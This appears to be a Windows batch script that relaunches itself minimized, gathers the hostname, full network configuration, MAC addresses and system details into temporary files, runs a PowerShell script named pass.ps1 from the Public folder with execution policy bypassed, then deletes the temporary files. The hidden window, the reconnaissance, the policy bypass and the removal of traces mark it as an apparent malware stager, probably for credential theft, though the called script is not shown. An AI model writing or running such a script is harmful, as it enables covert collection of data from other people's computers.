@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
hostname>pcinfo.tmp
> data.tmp (ipconfig /all
getmac /v
systeminfo
echo %date% at %time%)
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& '%public%\pass.ps1'"
del %public%\*.tmp
pause